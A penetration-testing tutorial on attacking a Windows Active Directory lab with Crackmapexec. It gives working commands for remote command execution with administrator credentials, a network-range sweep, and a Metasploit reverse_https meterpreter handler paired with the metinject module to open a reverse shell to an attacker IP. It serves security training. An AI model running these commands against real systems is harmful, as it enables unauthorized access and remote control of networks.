@@ -1,0 +1,39 @@
+
+Penetration Testing in Windows/Active Directory with Crackmapexec
+
+Crackmapexec is a swiss army knife for pentesting Windows/Active Directory environments. Active Directory (AD) is a directory service that Microsoft developed for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services.
+ First of all, to install crackmapexec run the following commands:
+apt-get install -y libssl-dev libffi-dev python-dev build-essential
+ I have already installed all the requirements that is why because it is showing already installed but you have to install them.
+Now we will create a virtual environment for  crackmapexec with virtualenvwrapper.
+virtualenvwrapper is a set of extensions to virtualenv tool. The extensions include wrappers for creating and deleting virtual environments and otherwise managing your development workflow, making it easier to work on more than one project at a time without introducing conflicts in their dependencies.
+apt-get install virtualenvwrapper
+source /usr/share/virtualenvwrapper/virtualenvwrapper.sh
+mkvirtualenv CME
+pip install git+https://github.com/CoreSecurity/impacket
+pip install crackmapexec
+
+Now to execute a windows command remotely run the following command:
+crackmapexec 192.168.0.104 –u administrator –p  ‘Igni*******’ –x whoami
+As you can see the server is Pwned and the output of the command is rajlab\administrator.
+Here 192.168.0.104 is the server IP running active directory service in the network. We can also execute a powershell command:
+
+crackmapexec 192.168.0.104 –u administrator –p  ‘Igni*******’ –X  ‘$PSVersionTable’
+The command is executed successfully and the output can be seen as the version of the powershell.
+If we don’t know the active directory server we can run crackmapexec on the whole network by giving the network range as in my case 192.168.0.0/24.
+
+Now comes the turn to get a meterpreter shell , so start  metasploit with command msfconsole in a new terminal and set up the reverse handler :
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost 192.168.0.132
+set lport 444
+exploit
+
+Now on the previous terminal run command:
+crackmapexec 192.168.0.104 -u administrator -p  Ign******* -M metinject –o LHOST=192.168.0.132 LPORT=444 
+As you can see payload is executed successfully and a powershell script Invoke-Shellcode.ps1 is executed to gets the reverse meterpreter shell using the metinject module to directly inject meterpreter into memory.
+Here –M is the Module to use.
+
+As you can see we got the meterpreter shell.
+
+Author: Himanshu Gupta is an InfoSec Researcher | Technical writer. You can follow him on LinkedIn .
